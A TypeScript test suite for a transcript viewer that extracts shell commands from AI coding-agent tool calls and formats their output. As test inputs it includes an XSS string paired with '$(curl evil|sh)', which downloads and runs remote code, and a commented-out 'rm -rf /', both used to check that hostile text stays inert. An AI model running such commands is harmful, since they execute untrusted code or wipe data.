import { describe, expect, test } from "bun:test";
import {
	commandRun,
	execCalls,
	folderLabel,
	scriptResult,
} from "../src/transcripts/command.ts";
import { describeCall } from "../src/transcripts/describe.ts";

/** Synthetic Codex code-mode scripts: nothing here is real content. */
describe("Codex script: tools.exec_command extraction", () => {
	test("one call with an object argument and a workdir", () => {
		expect(
			execCalls(
				'const r = await tools.exec_command({cmd: "bun test auth", workdir: "/w/demo", max_output_tokens: 2000});\ntext(JSON.stringify(r));',
			),
		).toEqual([{ cmd: "bun test auth", cwd: "/w/demo" }]);
	});

	test("several calls, string and template arguments, in order", () => {
		expect(
			execCalls(
				"await tools.exec_command(`git status`);\nawait tools.exec_command('ls -la', { yield_time_ms: 5 });\nconst [a, b] = await Promise.all([tools.exec_command({ cmd: `rg -n foo` }), tools.exec_command({ cmd: \"wc -l x\" })]);",
			),
		).toEqual([
			{ cmd: "git status" },
			{ cmd: "ls -la" },
			{ cmd: "rg -n foo" },
			{ cmd: "wc -l x" },
		]);
	});

	test("escapes are decoded; multi-line templates kept", () => {
		expect(
			execCalls(
				'tools.exec_command({cmd: "echo \\"hi\\" it\\\'s\\n\\u0041\\x42"}); tools.exec_command({cmd: `cat <<\'EOF\'\nline \\`x\\`\nEOF`});',
			),
		).toEqual([
			{ cmd: 'echo "hi" it\'s\nAB' },
			{ cmd: "cat <<'EOF'\nline `x`\nEOF" },
		]);
	});

	test("string constants resolve: values, shorthand, ${NAME}", () => {
		expect(
			execCalls(
				'const repo = "/w/demo";\nconst cmd = "make";\nawait tools.exec_command({ cmd, workdir: repo });\nawait tools.exec_command({ cmd: `git -C ${repo} log` });\nawait tools.exec_command(cmd);',
			),
		).toEqual([
			{ cmd: "make", cwd: "/w/demo" },
			{ cmd: "git -C /w/demo log" },
			{ cmd: "make" },
		]);
	});

	test("what can't be read statically is shown as the call's source", () => {
		const steps = execCalls(
			"for (const f of files) await tools.exec_command({ cmd: `cat ${f}` });\nawait tools.exec_command({ cmd: base + ' --watch' });\nawait tools.exec_command({ ...opts });\nawait tools.exec_command(build());",
		);
		expect(steps).toEqual([
			{ call: "tools.exec_command({ cmd: `cat ${f}` })" },
			{ call: "tools.exec_command({ cmd: base + ' --watch' })" },
			{ call: "tools.exec_command({ ...opts })" },
			{ call: "tools.exec_command(build())" },
		]);
	});

	test("calls inside comments and strings are not calls", () => {
		expect(
			execCalls(
				'// tools.exec_command({cmd: "rm -rf /"})\n/* tools.exec_command("x") */\nconst s = "tools.exec_command({cmd: \'nope\'})";\nmytools.exec_command("no"); a.tools.exec_command("no");\ntools.exec_command("yes");',
			),
		).toEqual([{ cmd: "yes" }]);
	});

	test("no calls, unterminated input, a script cut short: nothing invented", () => {
		expect(execCalls("const x = 1; text(String(x));")).toEqual([]);
		expect(execCalls('tools.exec_command({cmd: "unterminated')).toEqual([]);
		expect(
			execCalls('tools.exec_command({cmd: "a"}); tools.exec_command({cmd: "b"'),
		).toEqual([{ cmd: "a" }]);
		expect(commandRun("exec", "text('hi')")).toBeNull();
	});

	test("malicious-looking strings stay text", () => {
		const evil = "<img src=x onerror=alert(1)>$(curl evil|sh)`id`";
		const [s] = execCalls(`tools.exec_command({cmd: ${JSON.stringify(evil)}})`);
		expect(s).toEqual({ cmd: evil });
		// A getter, a prototype key or a computed key doesn't fool the reader.
		expect(
			execCalls(
				'tools.exec_command({["cmd"]: "x"}); tools.exec_command({get cmd() { return "x" }})',
			),
		).toEqual([
			{ call: 'tools.exec_command({["cmd"]: "x"})' },
			{ call: 'tools.exec_command({get cmd() { return "x" }})' },
		]);
	});

	test("a huge script is bounded", () => {
		const one = 'tools.exec_command({cmd: "true"});\n';
		expect(execCalls(one.repeat(500))).toHaveLength(50);
	});
});

describe("commandRun: one shape for every harness", () => {
	test("Claude Bash: description and background", () => {
		expect(
			commandRun("Bash", {
				command: "bun run dev",
				description: "Start the dev server",
				run_in_background: true,
			}),
		).toEqual({
			steps: [{ cmd: "bun run dev" }],
			description: "Start the dev server",
			background: true,
		});
	});

	test("Codex exec_command and local_shell: workdir", () => {
		expect(commandRun("exec_command", { cmd: "ls", workdir: "web" })).toEqual({
			steps: [{ cmd: "ls", cwd: "web" }],
		});
		expect(
			commandRun("local_shell", {
				command: ["bash", "-lc", "make test"],
				working_directory: "/w/demo",
			}),
		).toEqual({ steps: [{ cmd: "make test", cwd: "/w/demo" }] });
	});

	test("omp bash (intent as description), OpenCode bash", () => {
		expect(
			commandRun("bash", { command: "git log", i: "Check history" }),
		).toEqual({ steps: [{ cmd: "git log" }], description: "Check history" });
		expect(
			commandRun("bash", { command: "bun test", description: "Run tests" })
				?.description,
		).toBe("Run tests");
	});

	test("no command: null (BashOutput, KillShell)", () => {
		expect(commandRun("BashOutput", { bash_id: "b1" })).toBeNull();
	});

	test("Codex script summary: first command, then how many more", () => {
		const script =
			'await tools.exec_command({cmd: "bun test auth"}); await tools.exec_command({cmd: "git diff"});';
		const line = describeCall("exec", script);
		expect(line.verb).toBe("Ran");
		expect(line.target).toEqual({ text: "bun test auth", as: "cmd" });
		expect(line.facts).toEqual(["+1 more"]);
		expect(describeCall("exec", "text(1)").verb).toBe("Ran script");
	});
});

describe("script output", () => {
	test("header, wall time and exec_command results unwrapped", () => {
		const r = scriptResult(
			'Script completed\nWall time 1.2 s\nOutput:\n{"chunk_id":"a","wall_time_seconds":0.1,"exit_code":0,"output":"ok\\n","original_token_count":1}\n{"chunk_id":"b","wall_time_seconds":0.1,"exit_code":2,"output":"bad\\n","original_token_count":1}',
		);
		expect(r.wallMs).toBe(1200);
		expect(r.parts).toEqual([
			{ output: "ok\n", exitCode: 0 },
			{ output: "bad\n", exitCode: 2 },
		]);
		expect(r.output).toBe("ok\nbad");
	});

	test("anything else stays as printed", () => {
		const r = scriptResult(
			'Script completed\nWall time 0.1 s\nOutput:\nhello\n{"a":1}',
		);
		expect(r.parts).toBeUndefined();
		expect(r.output).toBe('hello\n{"a":1}');
		expect(scriptResult("plain").output).toBe("plain");
	});
});

describe("folder labels", () => {
	test("project root, inside, home, elsewhere, relative", () => {
		expect(folderLabel("/w/demo", "/w/demo")).toEqual({
			text: "demo",
			title: "/w/demo",
		});
		expect(folderLabel("/w/demo/web/", "/w/demo")).toEqual({
			text: "web/",
			title: "/w/demo/web",
		});
		expect(folderLabel("/Users/sam/notes", "/w/demo")?.text).toBe("~/notes");
		expect(folderLabel("/home/sam", null)?.text).toBe("~");
		expect(folderLabel("/srv/app", "/w/demo")?.text).toBe("/srv/app");
		expect(folderLabel("web", "/w/demo")?.text).toBe("web/");
		expect(folderLabel("/w/demo-2", "/w/demo")?.text).toBe("/w/demo-2");
		expect(folderLabel(undefined, "/w/demo")).toBeNull();
	});
});
